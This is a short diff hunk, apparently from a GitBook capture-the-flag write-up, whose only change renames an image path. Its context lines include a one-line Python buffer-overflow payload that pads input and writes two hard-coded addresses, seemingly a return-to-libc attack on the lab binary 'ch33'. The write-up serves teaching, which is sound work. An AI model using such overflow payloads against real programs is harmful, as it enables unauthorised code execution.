@@ -31,5 +31,5 @@ int main (int argc, char ** argv){
 ./ch33 `python -c "print 'A'*20 + '1'*12 + '\x10\x83\xe6\xb7' + 'AAAA' + '\x4c\xad\xf8\xb7'"`
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
